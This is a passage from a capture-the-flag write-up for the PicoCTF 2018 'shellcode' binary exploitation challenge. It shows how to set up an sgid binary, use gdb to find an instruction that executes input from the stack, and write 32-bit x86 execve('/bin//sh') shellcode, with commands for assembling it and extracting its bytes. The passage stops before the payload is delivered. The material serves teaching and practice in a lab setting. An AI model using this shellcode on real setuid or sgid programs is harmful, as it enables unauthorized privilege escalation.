# PicoCTF_2018: shellcode

**Category:** Binary Exploitation
**Points:** 200
>This program executes any input you give it. Can you get a shell? 
You can find the program in /problems/shellcode_1_cec2eb801137d645a9f15b9b6af5347a on the shell server. Source.

> # Introduction

In this write-up I am going to demostrate how to gain shell access by exploiting this vulnerable program.
I shall show it in both 32bit and 64bit systems and you'll see the main differences.

> # Prerequisites:

You need to have some basic knowledge about C, gcc, linux command line, linux file permissions and x86 assembly. 

> # Scenario:

We have access to a system with an executable binary and a txt file containing the flag. The txt file is owned by a group 
that we are not members, so we don't have access. However, the executable binary is owned from tha same group and it has the sgid bit set. If we exploit it
and gain shell access we will grant privileges. As a result, we will be capable of reading the flag.txt to find the solution.
More about linux file permissions and sgid [here]

> # Setting up the environment:
First of all you need to download the executable and the flag from my git repository [here](https://github.com/giannoulispanagiotis/picoCTF-2018-wiretup/tree/master/shellcode)
Now we need to set up the permissions for both of the files to create the right scenario.

1. For the executable file vuln:

```bash
[sudo] chown root:root vuln
[sudo] chmod g+s vuln
```


2. For the flag file
```bash
[sudo] chown root:root flag.txt
[sudo] chmod 440 flag.txt 
```
Confirm by listing the file with ls -l vuln flag.txt. The result have to be something like that:

```
-r--r----- 1 root root 35 Oct 5 00:27 flag.txt
-rwxr-sr-x root root 725472 Oct 5 00:23 vuln
```

As you can see flag's and vuln's group ownership is root. But our user is not in root's group unfortunately. As you can see flag.txt is readable only from owner(root) and the members of the group's ownership(root again). But in vuln's file permissions we notice two things. First group's ownership is also root and vuln has the sgid bit set. Which means that if we gain shell access from this executable our group id  will be root (0). I'll make it clear with screenshots soon. 

Okay now let's go to some nice stuff.
> # Shellcode Injection
We need to understand how the vuln program works. For this purpose we will make use of gdb to disassemble the program and find what it does.
This is how it looks like. (It may not be exactly the same in your case)


Nice, we see that the compiled binary is 32bit.
Inside the two functions (main and vuln) we have to observe two 2 things.
In the vuln function we see gets being called (which is vulnerable because doesn't check the size of our input, so we can overflow the buffer, but we don't need it in this program, it's much easier), so binary waits for input from stdin. Moreover, in the main function we can see the vulnerability we will exploit. **<main + 124>: call eax**
We want to find what it is inside register eax before we call it so we set a breakpoint before this instruction. Going down there we realize that in eax register is the address of the stack where our input is saved. So when we call eax, we tell our system  to go to this address and execute the instructions that will find there. Thus we understand that if we put in the right input (a shellcode) we can easily gain access. And .... let's go write this shellcode whatsoever.

> # Crafting Shellcode
I will try explain the shellcode that we will create in brief. First create shellcode.asm with the following code:
(Remember, memory is upside down, so when we want to push in the stack a string e.g. /bin/sh\0 we have to do it like that:
push \0 (null)
push //sh in hex
push /bin in hex
In 32 bit systems in a memory block fit 4 bytes, so we split our string. We also use 2 '//' so that we cover the whole block(4 bytes), albeit there will be something else in the 4th byte that we don't want to. /bin/sh and /bin//sh have no difference.

```asm
xor eax, eax ; clearing eax register
push eax     ; Pushing NULL bytes (\0)
push 0x68732f2f ; Pushing //sh
push 0x6e69622f  ; Pushing /bin
mov ebx, esp     ; ebx has address of /bin//sh
push eax         ; Pushing NULL byte (for argv array)
mov edx, esp     ; edx now has address of NULL byte
push ebx         ; pushing address of /bin//sh
mov ecx, esp     ; ecx now has address of address of /bin//sh 
mov al, 0xb    ; syscall number of execve is 11
int 0x80         ; system call
```

We call the execve function to get a shell.
In 32bit systems arguments of a function go in that way: eax, ebx, ecx, edx
Our function is:
```C
 int execve(const char *filename, char *const argv [], char *const envp[]);
```

This means we're passing the fllowing:
eax // Syscall of execve == 11 == 0xb
ebx // Arg#1: pointer to the program string ("/bin//sh")
ecx // Arg#2: pointer to the argunments array
(argv[0] = "/bin//sh" , argv[1] = NULL)
edx // Arg#3: pointer to the environment array (NULL)

To compile it use nasm:

```bash
nasm -f elf shellcode.asm
```

Now we want to get the shellcode bytes in hex format.
If we use objdump -d shellcode.o the result is our assembly code and the hexadecimal format of it. To keep only the hex code we can use this command:
```bash
for i in $(objdump -d shellcode.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo;
```
grep is used to keep only lines with a space in the beginning. cut -f2 





